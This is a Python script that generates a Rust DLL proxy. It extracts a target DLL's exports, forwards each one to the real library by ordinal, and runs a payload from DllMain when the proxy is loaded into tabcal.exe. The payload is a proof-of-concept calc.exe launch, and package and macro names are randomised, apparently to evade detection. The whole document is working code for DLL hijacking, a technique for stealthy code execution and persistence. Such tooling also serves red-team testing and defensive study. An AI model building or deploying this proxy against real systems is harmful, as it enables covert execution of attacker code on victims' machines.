import os
import random
import string
import subprocess
import sys
import pefile


def random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def extract_functions(dll_path):
    try:
        pe = pefile.PE(dll_path)
        functions = []
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if exp.name:
                functions.append(exp.name.decode('utf-8'))
        return functions
    except Exception as e:
        print(f"Error extracting functions from '{dll_path}': {e}")
        sys.exit(1)

def check_rust_installation():
    try:
        subprocess.run(["rustc", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Rust is installed.")
    except subprocess.CalledProcessError:
        print("Error: Rust is not installed.")
        print("Please install Rust from https://www.rust-lang.org/tools/install")
        sys.exit(1)

def check_dll_path(dll_path):
    if not os.path.isfile(dll_path):
        print(f"Error: The file at '{dll_path}' does not exist.")
        sys.exit(1)
    if not dll_path.lower().endswith('.dll'):
        print(f"Error: The file at '{dll_path}' is not a DLL file.")
        sys.exit(1)
    print(f"Valid DLL path: {dll_path}")

def print_usage():
    print("Usage: python Rdllproxy.py <path_to_dll>")
    print("  <path_to_dll>  Path to the DLL file from which to extract functions.")
    print("Ensure that the DLL path is correct and that Rust is installed.")

if len(sys.argv) != 2:
    print_usage()
    sys.exit(1)

dll_path = sys.argv[1]


print("Checking Rust installation...")
check_rust_installation()


print(f"Checking DLL path: {dll_path}")
check_dll_path(dll_path)

package_name = random_string()
version = f"0.{random.randint(1, 9)}.{random.randint(0, 9)}"

print(f"Creating new Rust library package '{package_name}'...")
subprocess.run(['cargo', 'new', '--lib', package_name], check=True)
os.chdir(package_name)

functions = extract_functions(dll_path)

with open('Cargo.toml', 'a') as cargo_file:
    cargo_file.write(f"""
[lib]
crate-type = ["cdylib"]

[dependencies]
winapi = {{ version = "0.3", features = ["processthreadsapi", "winbase", "winnt", "libloaderapi", "handleapi"] }}
""")
print("Updated Cargo.toml.")

macro_name = random_string()
print(f"Using random macro name: {macro_name}")

forward_function_macros = ""
for i, func in enumerate(functions, start=1):
    forward_function_macros += f"{macro_name}!({func}, {i});\n"
    print(f"Generating macro for function: {func}")

print("Writing Rust source code...")
with open('src/lib.rs', 'w') as lib_file:
    lib_file.write(f"""
extern crate winapi;

use std::ptr::null_mut;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::shared::minwindef::{{BOOL, DWORD, HINSTANCE, LPVOID, TRUE, FARPROC}};
use winapi::um::libloaderapi::{{LoadLibraryW, GetProcAddress}};
use winapi::um::processthreadsapi::CreateProcessW;
use winapi::um::processthreadsapi::PROCESS_INFORMATION;
use winapi::um::processthreadsapi::STARTUPINFOW;
use winapi::um::winbase::CREATE_UNICODE_ENVIRONMENT;
use std::sync::Once;
static INIT: Once = Once::new();
fn start_calc() {{
    let application_name: Vec<u16> = OsStr::new("C:\\\\Windows\\\\System32\\\\calc.exe")
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    unsafe {{
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        CreateProcessW(
            application_name.as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_UNICODE_ENVIRONMENT,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );

        // Close handles to the created process and its primary thread.
        winapi::um::handleapi::CloseHandle(process_info.hProcess);
        winapi::um::handleapi::CloseHandle(process_info.hThread);
    }}
}}

macro_rules! {macro_name} {{
    ($func_name:ident, $ordinal:expr) => {{
        #[no_mangle]
        #[allow(non_snake_case)]
        pub extern "stdcall" fn $func_name() {{
            unsafe {{
                static mut REAL_DLL: HINSTANCE = null_mut();
                if REAL_DLL.is_null() {{
                    let real_dll_path: Vec<u16> = OsStr::new("{dll_path}")
                        .encode_wide()
                        .chain(Some(0).into_iter())
                        .collect();
                    REAL_DLL = LoadLibraryW(real_dll_path.as_ptr());
                    if REAL_DLL.is_null() {{
                        return;
                    }}
                }}
                let func: FARPROC = GetProcAddress(REAL_DLL, $ordinal as *const i8);
                if !func.is_null() {{
                    std::mem::transmute::<FARPROC, extern "stdcall" fn()>(func)();
                }}
            }}
        }}
    }};
}}

{forward_function_macros}

fn process_check() -> bool {{
    let attachable_process_list = vec![
        "tabcal.exe".to_string(),
    ];
    let current_process = std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
        .unwrap();
    if attachable_process_list.contains(&current_process) {{
        return true
    }}
    false
}}

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) -> BOOL {{
    match fdwReason {{
        1 => {{
            INIT.call_once(|| {{
                if process_check(){{
                    start_calc();
                }}
            }})
        }},
        _ => {{}}
    }}
    TRUE
}}
""")
print("Rust source code written successfully.")
print("Rust library package setup is complete.")